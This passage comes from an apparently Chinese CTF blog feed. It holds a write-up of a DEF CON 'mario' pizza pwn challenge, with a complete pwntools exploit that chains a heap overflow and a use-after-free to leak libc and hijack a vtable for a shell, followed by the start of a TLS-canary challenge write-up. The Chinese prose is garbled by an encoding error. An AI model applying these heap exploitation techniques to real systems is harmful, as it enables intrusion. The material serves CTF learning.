class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">80</span>:</span><br><span class="line"> <span class="keyword">if</span> ( v3 )</span><br><span class="line"> &#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;last chance, explain yourself: &quot;</span>);</span><br><span class="line">   read_n_0(is_user[<span class="number">4</span>], <span class="number">300</span>);</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;too bad, no explanation is reasonable. BAM BAM BAM!&quot;</span>);</span><br><span class="line">   *((_BYTE *)is_user + <span class="number">65</span>) = <span class="number">1</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><br>  read_nå‡½æ•°å‚æ•°ä¸ºä¸Šä¹°mallocçš„å †ï¼Œä½†å¯å†™300å­—èŠ‚ï¼Œé€ æˆå †æº¢å‡º</p><p>  è¿˜æœ‰ä¸€å¤„æ¼æ´åœ¨äºcookåé¢ï¼š<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v14 &amp; <span class="number">0xF0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( v14 &gt;&gt; <span class="number">4</span> == (v13 &amp; <span class="number">0xF</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Molto bene, all cooked!&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !(v14 &amp; <span class="number">0xF</span>) )</span><br><span class="line">      <span class="built_in">free</span>(*(<span class="type">void</span> **)(a1 + <span class="number">0x20</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;found non-approved pizzas. come on.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>  å¦‚æœæœ‰1ä¸ªå¥½æŠ«è¨å’Œ0x10ä¸ªåæŠ«è¨åˆ™ä¼šæ‰§è¡Œfree(ä¸Šé¢mallocçš„)ï¼Œé€ æˆuafã€‚</p><p>  æ¼æ´å¤§æ¦‚æ˜¯è¿™äº›ï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•è®©marioç”Ÿæ°”äº†ã€‚<br>  é¢˜ç›®å¾ˆæœ‰æ„æ€ï¼Œå¦‚æœå†orderæŠ«è¨çš„æ—¶å€™æ·»åŠ é…æ–™é‡Œæœ‰ğŸï¼Œåˆ™ä¼šæ˜¯åæŠ«è¨ï¼Œmarioä¼šç”Ÿæ°”ï¼Œå¹¶ç›´æ¥é€€å‡ºã€‚<br>  å› æ­¤ä¸ºäº†åšåæŠ«è¨å¹¶ä¸é€€å‡ºï¼Œåˆ™å¯ä»¥é€šè¿‡ä¸¤ä¸ªutf8çš„æ‹¼æ¥æ¥å®ç°è èçš„è¾“å…¥ã€‚</p><p>  æŒ‰ç…§ä¸Šé¢çš„1ä¸ªå¥½0x10ä¸ªåä½¿å¾—free,æ§åˆ¶å¤§å°è¿›å…¥unsorted binï¼Œuafç¬¬ä¸€æ¬¡å¯æ³„éœ²heapï¼Œç¬¬äºŒæ¬¡å¯æ³„éœ²libcï¼Œè‡ªå·±è°ƒä¸‹å°±æ˜ç™½äº†ã€‚ä¹‹åå°±åˆ°æ‡µé€¼ç¯èŠ‚äº†ã€‚<br>  hxpå¤§ä½¬å…ˆnewä¹‹åcookçš„ç•™è¨€å†™äº†â€™vâ€™*4ä¸ªå­—èŠ‚ï¼Œç„¶åé€€å‡ºï¼Œä¹‹åç”¨å †æº¢å‡ºæ”¹å†™å‰é¢ä¸€ç›´åˆ©ç”¨çš„é‚£ä¸ªå †å—ä¸ºp64(win_addr)*2 + â€œXâ€*144 + p64(win_heap_addr)*2ï¼Œç„¶åæ‰§è¡Œadmireæ‹¿shellã€‚</p><p>  exp:<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">emojis = &#123;<span class="string">&#x27;pineapple&#x27;</span>: <span class="string">b&quot;\xf0\x9f\x8d\x8d&quot;</span>,</span><br><span class="line"><span class="string">&#x27;tomato&#x27;</span>: <span class="string">b&quot;\xf0\x9f\x8d\x85&quot;</span> &#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">addr,PIE=<span class="literal">True</span></span>):</span><br><span class="line"><span class="keyword">if</span> PIE:</span><br><span class="line">text_base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;| awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">gdb.attach(p,<span class="string">&#x27;b *&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(text_base+addr)))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(addr)))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cust_new</span>(<span class="params">name</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;N&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cust_login</span>(<span class="params">name</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;L&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cook</span>(<span class="params">explanation=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;C&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;explain:&quot;</span>)</span><br><span class="line">    p.sendline(explanation)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;USER MENU&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">order</span>(<span class="params">items</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;O&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;how many pizzas?&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(items)))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(items)):</span><br><span class="line">        p.recvuntil(<span class="string">&quot;how many ingredients?&quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(items[i])))</span><br><span class="line">        <span class="keyword">for</span> ing <span class="keyword">in</span> items[i]:</span><br><span class="line">            p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">            p.sendline(ing)</span><br><span class="line">            log.info(<span class="string">&quot;pizza &quot;</span> + <span class="built_in">str</span>(i+<span class="number">1</span>) + <span class="string">&quot;: adding &quot;</span> + <span class="built_in">str</span>(ing))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admire</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;A&quot;</span>)</span><br><span class="line">    p.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cust_logout</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;L&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">overflow</span>(<span class="params">payload</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;P&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;explain yourself:&quot;</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">why_upset</span>():</span><br><span class="line">    p.recvuntil(<span class="string">&quot;Choice:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">&quot;W&quot;</span>)</span><br><span class="line">    <span class="comment"># p.recvuntil(&quot;say: &quot;)</span></span><br><span class="line">    <span class="comment"># output = p.recvline()[:-1]</span></span><br><span class="line">    <span class="comment"># return repr(output)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">1234</span></span>):</span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line"><span class="keyword">if</span> host:</span><br><span class="line">p=remote(host,port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=process(<span class="string">&quot;./mario&quot;</span>)</span><br><span class="line">debug(<span class="number">0x0002E23</span>)</span><br><span class="line">cust_new(<span class="string">&#x27;1&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">good_pizza = [emojis[<span class="string">&#x27;tomato&#x27;</span>]]</span><br><span class="line">naughty_pizza = [emojis[<span class="string">&#x27;tomato&#x27;</span>] + emojis[<span class="string">&#x27;pineapple&#x27;</span>][:<span class="number">2</span>] + emojis[<span class="string">&#x27;pineapple&#x27;</span>][:<span class="number">2</span>], emojis[<span class="string">&#x27;pineapple&#x27;</span>][<span class="number">2</span>:] + emojis[<span class="string">&#x27;tomato&#x27;</span>]]</span><br><span class="line">payload=[]</span><br><span class="line">payload.append(good_pizza)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">payload.append(naughty_pizza)</span><br><span class="line">order(payload)</span><br><span class="line">cook(<span class="string">&#x27;1&#x27;</span>*<span class="number">0x104</span>)</span><br><span class="line">cust_logout()</span><br><span class="line">why_upset()</span><br><span class="line">p.recvuntil(<span class="string">&quot;say: &quot;</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">&quot;heap: &quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">cust_new(<span class="string">&#x27;2&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">order([good_pizza])</span><br><span class="line">cook(<span class="string">&#x27;2&#x27;</span>*<span class="number">0x104</span>)</span><br><span class="line">cust_logout()</span><br><span class="line">why_upset()</span><br><span class="line">p.recvuntil(<span class="string">&quot;say: &quot;</span>)</span><br><span class="line">libc.address=u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x6cdb78</span>+<span class="number">0x309000</span></span><br><span class="line">info(<span class="string">&quot;libc: &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">win_addr=libc.address+<span class="number">0x4527a</span></span><br><span class="line">cust_login(<span class="string">&#x27;2&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">order([[emojis[<span class="string">&#x27;tomato&#x27;</span>]]])</span><br><span class="line">cook(<span class="string">&#x27;v&#x27;</span>*<span class="number">4</span>)</span><br><span class="line">cust_logout()</span><br><span class="line">win_heap_addr=heap_addr - <span class="number">3984</span></span><br><span class="line">cust_login(<span class="string">&#x27;1&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">overflow(p64(win_addr)*<span class="number">2</span> + <span class="string">&quot;X&quot;</span>*<span class="number">144</span> + p64(win_heap_addr)*<span class="number">2</span>)</span><br><span class="line">cust_login(<span class="string">&quot;2&quot;</span>*<span class="number">8</span>)</span><br><span class="line">admire()</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">main(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><br>æˆ‘é£˜äº†ï¼Œè¿defconçš„é¢˜éƒ½æ•¢çœ‹äº†ï¼Œä¸è¿‡è¿™æ ·ä¹Ÿå¥½ï¼Œè®©æˆ‘çœ‹æ¸…äº†è‡ªå·±çš„æ°´å¹³ï¼Œå¸Œæœ›è‡ªå·±èƒ½æœ‰ä¸€å¤©å†æ¬¡å›æ¥çœ‹è¿™é“é¢˜ç›®çš„æ—¶å€™ï¼Œèƒ½å¤Ÿä¸åƒç°åœ¨å¦‚æ­¤è‰°éš¾å§ã€‚</p><p>è¡¥å……ï¼Œå¦‚æ²¡æœ‰æœ€åä¸¤ä¸ªp64çš„è¦†ç›–ï¼Œåˆ™åœ¨æ‰§è¡Œcall raxæ˜¯å¯„å­˜å™¨ä½ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> RAX  0x55aea44fbcac â—‚â€” push   rbp</span><br><span class="line"> RBX  0x0</span><br><span class="line"> RCX  0x7ffd8bcbffa0 â—‚â€” 0x0</span><br><span class="line"> RDX  0x55aea59401d0 â€”â–¸ 0x55aea4705c00 â€”â–¸ 0x55aea44fbcac â—‚â€” push   rbp</span><br><span class="line"> RDI  0x55aea59401d0 â€”â–¸ 0x55aea4705c00 â€”â–¸ 0x55aea44fbcac â—‚â€” push   rbp</span><br><span class="line"> RSI  0x7ffd8bcbffa0 â—‚â€” 0x0</span><br><span class="line"> R8   0x7f3d93746740 â—‚â€” 0x7f3d93746740</span><br><span class="line"> R9   0x2020202020202020 (&#x27;        &#x27;)</span><br><span class="line"> R10  0x0</span><br><span class="line"> R11  0x246</span><br><span class="line"> R12  0x55aea44fb5f0 â—‚â€” xor    ebp, ebp</span><br><span class="line"> R13  0x7ffd8bcc19f0 â—‚â€” 0x1</span><br><span class="line"> R14  0x0</span><br><span class="line"> R15  0x0</span><br><span class="line"> RBP  0x7ffd8bcc18b0 â€”â–¸ 0x7ffd8bcc18d0 â€”â–¸ 0x7ffd8bcc18f0 â€”â–¸ 0x7ffd8bcc1910 â€”â–¸ 0x55aea45012f0 â—‚â€” ...</span><br><span class="line"> RSP  0x7ffd8bcbff70 â—‚â€” 0x0</span><br><span class="line"> RIP  0x55aea44fd039 â—‚â€” call   rax</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€</span><br><span class="line">   0x55aea44fd022    mov    rax, qword ptr [rax]</span><br><span class="line">   0x55aea44fd025    lea    rcx, [rbp - 0x1910]</span><br><span class="line">   0x55aea44fd02c    mov    rdx, qword ptr [rbp - 0x1918]</span><br><span class="line">   0x55aea44fd033    mov    rsi, rcx</span><br><span class="line">   0x55aea44fd036    mov    rdi, rdx</span><br><span class="line"> â–º 0x55aea44fd039    call   rax</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope 0x55aea5940130 40</span><br><span class="line">00:0000â”‚          0x55aea5940130 â€”â–¸ 0x7f3d92c2327a (do_system+1098) â—‚â€” mov    rax, qword ptr [rip + 0x37ec37]</span><br><span class="line">... â†“</span><br><span class="line">02:0010â”‚          0x55aea5940140 â—‚â€” &#x27;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&#x27;</span><br><span class="line">... â†“</span><br><span class="line">14:00a0â”‚ rdx rdi  0x55aea59401d0 â€”â–¸ 0x55aea4705c00 â€”â–¸ 0x55aea44fbcac â—‚â€” push   rbp</span><br><span class="line">15:00a8â”‚          0x55aea59401d8 â€”â–¸ 0x55aea5940210 â—‚â€” 0x7f00858d9ff0</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œæ‹¿shellçš„å…³é”®æ˜¯åœ¨heap_overflowçš„æ—¶å€™æ”¹æ‰ä½äº0x55aea59401d0 â€”â–¸ 0x55aea4705c00 â€”â–¸ 0x55aea44fbcac â—‚â€” push   rbpçš„vtablï¼ˆæ”¹æˆwin_heap_addrï¼Œ0x55aea44fbcacæœ¬æ¥æ˜¯è¦æ‰“å°pizza_objectçš„ï¼‰ä»è€Œåœ¨call raxæ—¶å€™å®ç°get shell!!!</p><p>åŸºæœ¬æ˜ç™½è¿™é¢˜çš„æ€è·¯äº†ï¼Œæœ€åæ‹¿shellçš„æ¼æ´æ˜æ˜¾ä¸“é—¨è®¾è®¡çš„ï¼Œç•¥æ˜¾ç”Ÿç¡¬ğŸš©</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å›½èµ›_final</title>
      <link href="/2020/09/26/%E5%9B%BD%E8%B5%9B_final%E6%88%98%E8%AE%B0/"/>
      <url>/2020/09/26/%E5%9B%BD%E8%B5%9B_final%E6%88%98%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="å›½èµ›-final-inæ­¦æ±‰"><a href="#å›½èµ›-final-inæ­¦æ±‰" class="headerlink" title="å›½èµ›_final inæ­¦æ±‰"></a>å›½èµ›_final inæ­¦æ±‰</h2><blockquote><p>ç¬¬äºŒæ¬¡æ‰“çº¿ä¸‹äº†ï¼Œå‡ºç°äº†å¾ˆå¤šé—®é¢˜ã€‚ç°åœ¨çš„å¤§æ¯”èµ›åŸºæœ¬ä¸æ€ä¹ˆå‡ºheapç›¸å…³çš„å¥—è·¯é¢˜ç›®äº†ï¼ˆé™¤äº†é’ˆå¯¹æ–°ç‰ˆlibcçš„ä¸€äº›åˆ©ç”¨æ–¹å¼å’Œå¤æ‚çš„å †é£æ°´ä¹‹å¤–ï¼‰ï¼Œæ¯”è¾ƒå¸¸å‡ºçš„é¢˜å‹æœ‰vmpwnï¼Œå¼‚æ„æ¶ä¸‹ï¼ˆmips,armï¼‰çš„pwnï¼ŒC++ç¨‹åºä»¥åŠä¸€äº›åº•å±‚æœºåˆ¶çš„æ¼æ´ã€‚åŒæ—¶é€†å‘ä¹Ÿéšä¹‹å¢å¤§ã€‚è¦åŠ å¼ºè‡ªå·±çš„é€†å‘åŠŸåº•äº†ã€‚</p></blockquote><span id="more"></span><h3 id="day1"><a href="#day1" class="headerlink" title="day1"></a>day1</h3><p>ç¬¬ä¸€å¤©æ˜¯awdï¼Œå¹³å°å´©äº†ï¼Œè¢«è¿«åœèµ›ã€‚æˆ‘ä¹Ÿä¸å¤šbbå¹³å°äº†ï¼Œç€çœ¼äºé¢˜ç›®å§ï¼ˆè´¨é‡è¿˜æ˜¯æŒºé«˜çš„ï¼‰ã€‚<br>æŒ‰é¢˜ç›®çš„éš¾æ˜“ç¨‹åº¦æ¥å§ï¼š</p><h4 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h4><p>ä¸€é“çº¿ç¨‹pwné¢˜ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( pthread_create(&amp;newthread, <span class="number">0LL</span>, (<span class="type">void</span> *(*)(<span class="type">void</span> *))start_routine, <span class="number">0LL</span>) == <span class="number">-1</span> )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;create thread failed&quot;</span>);</span><br><span class="line">    pthread_join(newthread, <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>æ¼æ´åœ¨äºstart_routineé‡Œçš„__printf_chkå­˜åœ¨fmtä»¥åŠæ ˆæº¢å‡ºã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">start_routine</span><span class="params">(<span class="type">void</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v2; <span class="comment">// [rsp+0h] [rbp-40h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line">  __int64 retaddr; <span class="comment">// [rsp+48h] [rbp+8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  ret_address = (__int64)&amp;retaddr;</span><br><span class="line">  save_ret = retaddr;</span><br><span class="line">  gets(&amp;v2);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, (__int64)&amp;v2);</span><br><span class="line">  *(_QWORD *)ret_address = save_ret;</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>__printf_chkå‡½æ•°ä¼šæ£€æµ‹%nä»¥åŠ%()$()è¿™æ ·çš„çš„æ ¼å¼ï¼Œå› æ­¤åªèƒ½ç”¨-%p-%p-è¿™æ ·æ³„éœ²äº†ã€‚ç”±äºç¨‹åºå­˜åœ¨å†™å›ret_addrçš„æ“ä½œï¼Œå¯¼è‡´æ ˆæº¢å‡ºè¦†ç›–è¿”å›åœ°å€çš„æ–¹æ³•å¤±æ•ˆäº†ï¼Œè¿™ä¹Ÿæ˜¯è¿™é“é¢˜çš„éš¾ç‚¹æ‰€åœ¨ã€‚</p><p>é‡ç‚¹ï¼Œè®°ç¬”è®°ï¼š<br>åœ¨çº¿ç¨‹ä¸­å­˜åœ¨ä¸€ç§TSLæœºåˆ¶ï¼šå¦‚æœéœ€è¦åœ¨ä¸€ä¸ªçº¿ç¨‹å†…éƒ¨çš„å„ä¸ªå‡½æ•°è°ƒç”¨éƒ½èƒ½è®¿é—®ã€ä½†å…¶å®ƒçº¿ç¨‹ä¸èƒ½è®¿é—®çš„å˜é‡ï¼ˆè¢«ç§°ä¸ºstatic memory local to a thread çº¿ç¨‹å±€éƒ¨é™æ€å˜é‡ï¼‰ï¼Œå°±éœ€è¦æ–°çš„æœºåˆ¶æ¥å®ç°ï¼Œè¿™å°±æ˜¯TLSã€‚<br>æˆ‘ä»¬ç†ŸçŸ¥çš„canaryå°±æ˜¯å­˜æ”¾åœ¨tlsä¸­ï¼Œåœ¨retæ—¶å’Œstackä¸­çš„canaryæ¯”è¾ƒã€‚</p><p>å…¶ç»“æ„ä½“ä¸ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">void</span> *tcb;<span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">   thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="type">dtv_t</span> *dtv;</span><br><span class="line">  <span class="type">void</span> *self;<span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> multiple_threads;</span><br><span class="line">  <span class="type">int</span> gscope_flag;</span><br><span class="line">  <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="type">uintptr_t</span> stack_guard;  <span class="comment">/*canary</span></span><br><span class="line"><span class="comment">  uintptr_t pointer_guard;</span></span><br><span class="line"><span class="comment">  unsigned long int vgetcpu_cache[2];</span></span><br><span class="line"><span class="comment">  /* Bit 0: X86_FEATURE_1_IBT.</span></span><br><span class="line"><span class="comment">     Bit 1: X86_FEATURE_1_SHSTK.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> feature_1;</span><br><span class="line">  <span class="type">int</span> __glibc_unused1;</span><br><span class="line">  <span class="comment">/* Reservation of some values for the TM ABI.  */</span></span><br><span class="line">  <span class="type">void</span> 